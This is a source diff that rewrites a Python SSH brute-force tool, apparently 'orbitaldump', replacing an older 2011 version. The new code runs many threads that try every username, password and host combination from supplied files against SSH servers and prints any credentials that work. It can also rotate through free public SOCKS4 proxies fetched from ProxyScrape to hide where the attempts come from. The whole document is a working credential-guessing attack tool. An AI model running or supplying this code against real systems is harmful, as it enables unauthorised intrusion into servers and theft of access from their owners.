@@ -1,286 +1,337 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 '''
 Created on Aug 25, 2011
 
 @author: r4stl1n
 '''
-
-import random
+import argparse
+import collections
+import logging
+import pathlib
+import queue
+import socket
 import sys
-from optparse import OptionParser
+import threading
+import time
 
-import Util
-from Connection import Connection
+import paramiko
+import requests
+import socks
+from loguru import logger
+
+# format string for Loguru loggers
+LOGURU_FORMAT = (
+    "<green>{time:HH:mm:ss.SSSSSS!UTC}</green> | "
+    "<level>{level: <8}</level> | "
+    "<level>{message}</level>"
+)
 
 
-class SSHBruteForce():
-    def __init__(self):
-        self.info = "Simple SSH Brute Forcer"
-        self.targetIp = ""
-        self.targetPort = 0
-        self.targets = []
-        self.usernames = []
-        self.passwords = []
-        self.connections = []
-        self.amountOfThreads = 0
-        self.currentThreadCount = 0
-        self.timeoutTime = 0
-        self.outputFileName = None
-        self.singleMode = False
-        self.verbose = False
-        self.bruteForceLength = 0
-        self.bruteForceAttempts = 0
-        self.bruteForceMode = False
-        self.characters = "abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+class SshBruteForcer(threading.Thread):
+    """
+    SSH brute forcer thread
 
-    def startUp(self):
-        usage = '{} [-i targetIp] [-U usernamesFile] [-P passwordsFile]'.format(sys.argv[0])
+    :param jobs queue.Queue: a queue object containing scanning jobs
+    :param valid_credentials list: a list to contain valid credentials
+    :param proxies collections.deque: a deque of proxies to use
+    :param break_on_success bool: stop execution upon finding valid credentials
+    """
 
-        optionParser = OptionParser(version=self.info, usage=usage)
+    def __init__(
+        self,
+        jobs: queue.Queue,
+        valid_credentials: list,
+        proxies: collections.deque = None,
+        break_on_success: bool = False,
+    ):
+        threading.Thread.__init__(self)
+        self.jobs = jobs
+        self.valid_credentials = valid_credentials
+        self.proxies = proxies
+        self.break_on_success = break_on_success
 
-        optionParser.add_option('-i', dest='targetIp',
-                                help='Ip to attack')
-        optionParser.add_option('-p', dest='targetPort',
-                                help='Ip port to attack', default=22)
-        optionParser.add_option('-d', dest='typeOfAttack',
-                                help='Dictionary Attack', default=False)
-        optionParser.add_option('-a', dest='attemptAmount',
-                                help="Number of attempts before stopping", default=2)
-        optionParser.add_option('-l', dest='lengthLimit',
-                                help='Length of bruteforce strings', default=8)
-        optionParser.add_option('-I', dest='targetsFile',
-                                help='List of IP\'s and ports')
-        optionParser.add_option('-C', dest='combolistFile',
-                                help='Combo List file')
-        optionParser.add_option('-U', dest='usernamesFile',
-                                help='Username List file')
-        optionParser.add_option('-P', dest='passwordsFile',
-                                help='Password List file')
-        optionParser.add_option('-t', type='int', dest='threads',
-                                help='Amount of Threads', default=10)
-        optionParser.add_option('-T', type='int', dest='timeout',
-                                help='Timeout Time', default=15)
-        optionParser.add_option('-O', dest="outputFile",
-                                help='Output File Name', default=None)
-        optionParser.add_option('-v', '--verbose', action='store_true',
-                                dest='verbose', help='verbose')
+        self.running = False
 
-        (options, args) = optionParser.parse_args()
+    def run(self):
+        self.running = True
+        while self.running is True:
 
-        # First a check is used to see if there is at least a singleIp set or a targetList set
-        if not options.targetIp and not options.targetsFile:
-            optionParser.print_help()
-            sys.exit(1)
+            # if break on success is set and a valid credential
+            # has already been found, stop the thread
+            if self.break_on_success is True and len(self.valid_credentials) > 0:
+                self.running = False
+                break
 
-        else:
-            # Check to see if we are running a dictionary attack or a bruteforce
-            if bool(options.typeOfAttack) == True:
-                # Then another check to make sure the Username list and passwordlist are filled
-                if (options.usernamesFile and options.passwordsFile) or options.combolistFile:
-                    # Then we check if it is a single ip only
-                    if options.targetIp and not options.targetsFile:
-                        self.singleMode = True
-                        self.singleTarget(options)
-                    elif not options.targetIp and options.targetsFile:
-                        self.multipleTargets(options)
-                    else:
-                        optionParser.print_help()
-                        sys.exit(1)
+            try:
+                hostname, username, password, port, timeout = self.jobs.get(False)
+            except queue.Empty:
+                time.sleep(0.1)
+                continue
+
+            try:
+                sock = None
+                if self.proxies is not None:
+                    self.proxy = self.proxies.popleft()
+                    sock = socks.socksocket()
+                    sock.set_proxy(
+                        proxy_type=socks.SOCKS4,
+                        addr=self.proxy.split(":")[0],
+                        port=int(self.proxy.split(":")[1]),
+                    )
+                    sock.settimeout(timeout)
+                    sock.connect((hostname, port))
+
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+                logger.debug(
+                    f"Testing {username}@{hostname}:{port}:{password}"
+                    + (f" with proxy {self.proxy}" if self.proxies else "")
+                )
+
+                client.connect(
+                    hostname=hostname,
+                    username=username,
+                    password=password,
+                    port=port,
+                    timeout=timeout,
+                    sock=sock,
+                    allow_agent=False,
+                    look_for_keys=False,
+                    banner_timeout=timeout,
+                    auth_timeout=timeout
+                )
+
+            # authentication failure (wrong password)
+            except paramiko.AuthenticationException:
+                logger.info(
+                    f"(queue size: {self.jobs.qsize()}) Invalid credential: "
+                    f"{username}@{hostname}:{port}:{password}"
+                )
+                client.close()
+
+            # connection timeout
+            except (
+                socket.timeout,
+                socks.GeneralProxyError,
+                socks.ProxyConnectionError,
+            ):
+                logger.debug(
+                    f"(queue size: {self.jobs.qsize()}) Connection error: "
+                    f"{username}@{hostname}:{port}:{password}"
+                )
+                self.jobs.put((hostname, username, password, port, timeout))
+                client.close()
+            except paramiko.SSHException as error:
+                logger.debug(
+                    f"(queue size: {self.jobs.qsize()}) SSHConnection error {error}: "
+                    f"{username}@{hostname}:{port}:{password}"
+                )
+                self.jobs.put((hostname, username, password, port, timeout))
+                client.close()
+            # other uncaught exceptions
+            except Exception as error:
+                logger.error(
+                    f"(queue size: {self.jobs.qsize()}) Uncaught exception {error}: "
+                    f"{username}@{hostname}:{port}:{password}"
+                )
+                client.close()
+
+            # login successful
+            else:
+                logger.success(
+                    f"(queue size: {self.jobs.qsize()}) Valid credential found: "
+                    f"{username}@{hostname}:{port}:{password}"
+                )
+                self.valid_credentials.append(
+                    (hostname, username, password, port, timeout)
+                )
+                client.close()
+
+            if self.proxies is not None:
+                self.proxies.append(self.proxy)
+
+            self.jobs.task_done()
+
+        return super().run()
+
+    def stop(self):
+        self.running = False
+        self.join()
+
+
+def parse_arguments() -> argparse.Namespace:
+    """
+    parse command line arguments
+
+    :rtype argparse.Namespace: namespace storing the parsed arguments
+    """
+
+    parser = argparse.ArgumentParser(
+        prog="orbitaldump",
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+        add_help=False,
+    )
+    parser.add_argument("--help", action="help", help="show this help message and exit")
+    parser.add_argument(
+        "-t", "--threads", help="number of threads to use", default=5, type=int
+    )
+    parser.add_argument(
+        "-u", "--username", type=pathlib.Path, help="username file path", required=True
+    )
+    parser.add_argument(
+        "-p", "--password", type=pathlib.Path, help="password file path", required=True
+    )
+    parser.add_argument(
+       "-h", "--hostname", type=pathlib.Path, help="hostnames file path", required=True
+    )
+    #parser.add_argument("-h", "--hostname", help="target hostname", required=True)
+    parser.add_argument("--port", type=int, help="target port", default=22)
+    parser.add_argument("--timeout", type=int, help="SSH timeout", default=6)
+    parser.add_argument(
+        "--proxies", help="use SOCKS proxies from ProxyScrape", action="store_true"
+    )
+    parser.add_argument(
+        "-b",
+        "--break",
+        help="break upon finding a valid credential",
+        action="store_true",
+    )
+
+    return parser.parse_args()
+
+
+def get_proxies() -> collections.deque:
+    """
+    retrieve a list(deque) of usable SOCKS4 proxies from ProxyScrape
+    the format looks something like deque(["1.1.1.1:1080", "2.2.2.2:1080"])
+
+    :rtype collections.deque: a deque of proxies
+    """
+    logger.info("Retrieving SOCKS4 proxies from ProxyScrape")
+    proxies_request = requests.get(
+        "https://api.proxyscrape.com/v2/?request="
+        "getproxies&protocol=socks4&timeout=10000&country=all"
+    )
+
+    # if response status code is 200, return the list of retrieved proxies
+    if proxies_request.status_code == requests.codes.ok:
+        proxies = proxies_request.text.split()
+        logger.info(f"Successfully retrieved {len(proxies)} proxies")
+        return collections.deque(proxies)
+
+    # requests failed to download the list of proxies, raise an exception
+    logger.critical("An error occurred while retrieving a list of proxies")
+    proxies_request.raise_for_status()
+
+
+def main() -> int:
+    # disable built-in logging so paramiko won't print tracebacks
+    logging.basicConfig(level=logging.CRITICAL)
+
+    # remove built-in logger sink
+    logger.remove()
+
+    # add custom logger sink
+    logger.add(sys.stderr, colorize=True, format=LOGURU_FORMAT)
+
+    try:
+        # parse command line arguments
+        args = parse_arguments()
+
+        # verify argument validity
+        try:
+            assert args.threads >= 1, "number of threads must >= 1"
+            assert args.username.is_file(), "username file does not exist"
+            assert args.password.is_file(), "password file does not exist"
+            assert args.hostname.is_file(), "hostname file does not exist"
+            assert args.port >= 0, "the port number must >= 0"
+            assert args.timeout >= 0, "timeout must >= 0"
+        except AssertionError as error:
+            logger.error(error)
+            return 1
+
+        # initialize variables
+        thread_pool = []
+        jobs = queue.Queue()
+        valid_credentials = []
+
+        # get proxies from ProxyScrape
+        proxies = None
+        if args.proxies:
+            proxies = get_proxies()
+
+        # create threads
+        logger.info(f"Launching {args.threads} brute-forcer threads")
+        for thread_id in range(args.threads):
+            thread = SshBruteForcer(jobs, valid_credentials, proxies)
+            thread.name = str(thread_id)
+            thread.start()
+            thread_pool.append(thread)
+
+        # read usernames and passwords from file
+        with args.username.open("r") as username_file:
+            usernames = username_file.readlines()
+        with args.password.open("r") as password_file:
+            passwords = password_file.readlines()
+        with args.hostname.open("r") as hostname_file:
+            hostnames = hostname_file.readlines()
+
+        # add username and password combinations to jobs queue
+        logger.info("Loading usernames and passwords into queue")
+
+        for username in usernames:
+            for password in passwords:
+                for hostname in hostnames:
+                    jobs.put(
+                        (
+                            hostname.strip(),
+                            username.strip(),
+                            password.strip(),
+                            args.port,
+                            args.timeout,
+                        )
+                    )
+
+        try:
+            while not jobs.empty():
+                for thread in thread_pool:
+                    if not thread.is_alive():
+                        logger.error(
+                            f"Thread {thread.name} exited early with errors",
+                            file=sys.stderr,
+                        )
+
+                for thread in thread_pool:
+                    if thread.is_alive():
+                        break
                 else:
-                    optionParser.print_help()
-                    sys.exit(1)
-            else:
-                # setup the brtue force
-                self.bruteForceMode = True
-                # Then we check if it is a single ip only
-                if options.targetIp and not options.targetsFile:
-                    self.singleMode = True
-                    self.singleTarget(options)
-                elif not options.targetIp and options.targetsFile:
-                    self.multipleTargets(options)
-                else:
-                    optionParser.print_help()
-                    sys.exit(1)
+                    break
 
-    def singleTarget(self, options):
-        self.targetIp = options.targetIp
-        self.targetPort = options.targetPort
-        self.amountOfThreads = options.threads
-        self.timeoutTime = options.timeout
-        self.outputFileName = options.outputFile
-        self.verbose = options.verbose
-        self.bruteForceLength = options.lengthLimit
-        self.bruteForceAttempts = options.attemptAmount
+        except (SystemExit, KeyboardInterrupt):
+            logger.warning("Stop signal received, stopping threads")
 
-        if bool(options.typeOfAttack):
-            if options.combolistFile:
-                self.usernames, self.passwords = self.__seperateDataFromComboList(options.combolistFile)
-            else:
-                self.usernames = Util.fileContentsToList(options.usernamesFile)
-                self.passwords = Util.fileContentsToList(options.passwordsFile)
-            self.showStartInfo()
-            self.dictionaryAttackSingle()
-        else:
-            self.showStartInfo()
-            self.bruteForceSingle()
+        finally:
+            for thread in thread_pool:
+                thread.stop()
 
-    def multipleTargets(self, options):
-        self.targets = Util.fileContentsToTuple(options.targetsFile)
-        self.amountOfThreads = options.threads
-        self.timeoutTime = options.timeout
-        self.outputFileName = options.outputFile
-        self.verbose = options.verbose
-        self.bruteForceLength = options.lengthLimit
-        self.bruteForceAttempts = options.attemptAmount
+            for thread in thread_pool:
+                thread.join()
 
-        if bool(options.typeOfAttack):
-            if options.combolistFile:
-                self.usernames, self.passwords = self.__seperateDataFromComboList(options.combolistFile)
-            else:
-                self.usernames = Util.fileContentsToList(options.usernamesFile)
-                self.passwords = Util.fileContentsToList(options.passwordsFile)
-            self.showStartInfo()
-            self.dictionaryAttackMultiple()
-        else:
-            self.showStartInfo()
-            self.bruteForceMultiple()
+        logger.success(
+            f"Brute-force completed, {len(valid_credentials)} valid credentials found"
+        )
+        for hostname, username, password, port, timeout in valid_credentials:
+            print(f"{username}@{hostname}:{port}:{password}")
 
-    @staticmethod
-    def __seperateDataFromComboList(comboListFile):
-        usernames = []
-        passwords = []
-        for t in Util.fileContentsToTuple(comboListFile):
-            usernames.append(t[0])
-            passwords.append(t[1])
-        return usernames, passwords
+        return 0
 
-    def showStartInfo(self):
-        print("[*] {} ".format(self.info))
-        if self.singleMode:
-            print("[*] Brute Forcing {}".format(self.targetIp))
-        else:
-            print("[*] Loaded {} Targets ".format(str(len(self.targets))))
-
-        if self.bruteForceMode == False:
-            print("[*] Loaded {} Usernames ".format(str(len(self.usernames))))
-            print("[*] Loaded {} Passwords ".format(str(len(self.passwords))))
-        print("[*] Brute Force Starting ")
-
-        if self.outputFileName is not None:
-            Util.appendLineToFile("{}".format(self.info), self.outputFileName)
-	    if self.singleMode:
-                Util.appendLineToFile("Brute Forcing {} ".format(self.targetIp, self.outputFileName))
-            else:
-                Util.appendLineToFile("Loaded {} Targets ".format(len(self.targets)), self.outputFileName)
-            	Util.appendLineToFile("Loaded {} Usernames ".format(len(self.usernames)), self.outputFileName)
-            	Util.appendLineToFile("Loaded {} Passwords ".format(len(self.passwords)), self.outputFileName)
-            	Util.appendLineToFile("Brute Force Starting ", self.outputFileName)
-
-    def dictionaryAttackSingle(self):
-        for username in self.usernames:
-            for password in self.passwords:
-
-                self.createConnection(username, password, self.targetIp,
-                                      self.targetPort, self.timeoutTime)
-                if self.currentThreadCount == self.amountOfThreads:
-                    self.currentThreadResults()
-        self.currentThreadResults()
-
-    def dictionaryAttackMultiple(self):
-        for target in self.targets:
-            for username in self.usernames:
-                for password in self.passwords:
-                    self.createConnection(username, password, target[0],
-                                          int(target[1]), self.timeoutTime)
-                    if self.currentThreadCount == self.amountOfThreads:
-                        self.currentThreadResults()
-        self.currentThreadResults()
-
-    def bruteForceSingle(self):
-        for x in range(int(self.bruteForceAttempts)):
-            randomUserString = ""
-            randomPasswordString = ""
-            randomStringLength = random.randint(4, int(self.bruteForceLength))
-            for y in range(randomStringLength):
-                randomUserString = randomUserString + random.choice(self.characters)
-
-            randomStringLength = random.randint(4, int(self.bruteForceLength))
-
-            for z in range(randomStringLength):
-                randomPasswordString = randomPasswordString + random.choice(self.characters)
-
-            self.createConnection(randomUserString, randomPasswordString, self.targetIp,
-                                  self.targetPort, self.timeoutTime)
-            if self.currentThreadCount == self.amountOfThreads:
-                self.currentThreadResults()
-        self.currentThreadResults()
-
-    def bruteForceMultiple(self):
-        for target in self.targets:
-            for x in range(self.bruteForceAttempts):
-                randomUserString = ""
-                randomPasswordString = ""
-                randomStringLength = random.randint(4, self.bruteForceLength)
-
-                for y in range(randomStringLength):
-                    randomUserString = randomUserString + random.choice(self.characters)
-
-                randomStringLength = random.randint(4, self.bruteForceLength)
-
-                for z in range(randomStringLength):
-                    randomPasswordString = randomPasswordString + random.choice(self.characters)
-
-                self.createConnection(randomUserString, randomPasswordString, target,
-                                      self.targetPort, self.timeoutTime)
-                if self.currentThreadCount == self.amountOfThreads:
-                    self.currentThreadResults()
-
-        self.currentThreadResults()
-
-    def createConnection(self, username, password, targetIp, targetPort, timeoutTime):
-        connection = Connection(username, password, targetIp, targetPort, timeoutTime)
-        connection.start()
-
-        self.connections.append(connection)
-        self.currentThreadCount += 1
-        if self.verbose:
-            print("[*] Adding Target: {0}, Testing with username: {1}, testing with password: {2}".format(targetIp,
-                                                                                                          username,
-                                                                                                          password))
-
-    def currentThreadResults(self):
-        for connection in self.connections:
-            connection.join()
-
-            if connection.status == 'Succeeded':
-                print("[#] TargetIp: {} ".format(connection.targetIp))
-                print("[#] Username: {} ".format(connection.username))
-                print("[#] Password: {} ".format(connection.password))
-
-                if self.outputFileName is not None:
-		    #Util.appendLineToFile("TargetIp: {}" .format(connection.targetIp, self.outputFileName))
-		    #Util.appendLineToFile("Username: {} ".format(connection.username, self.outputFileName))
-		    #Util.appendLineToFile("Password: {} ".format(connection.password, self.outputFileName))
-		    Util.appendLineToFile("TargetIp: {} ".format(connection.targetIp), self.outputFileName)
-		    Util.appendLineToFile("Username: {} ".format(connection.username), self.outputFileName)
-                    Util.appendLineToFile("Password: {} ".format(connection.password), self.outputFileName)
-
-                if self.singleMode:
-                    self.completed()
-            else:
-                pass
-
-        self.clearOldThreads()
-
-    def clearOldThreads(self):
-        self.connections = []
-        self.threadCount = 0
-
-    def completed(self):
-        print("[*] Completed Brute Force.")
-        sys.exit(0)
+    except Exception as error:
+        logger.exception(error)
+        return 1
 
 
-if __name__ == '__main__':
-    sshBruteForce = SSHBruteForce()
-    sshBruteForce.startUp()
-    print("[*] Brute Force Completed")
+# launch the main function if this file is ran directly
+if __name__ == "__main__":
+    sys.exit(main())
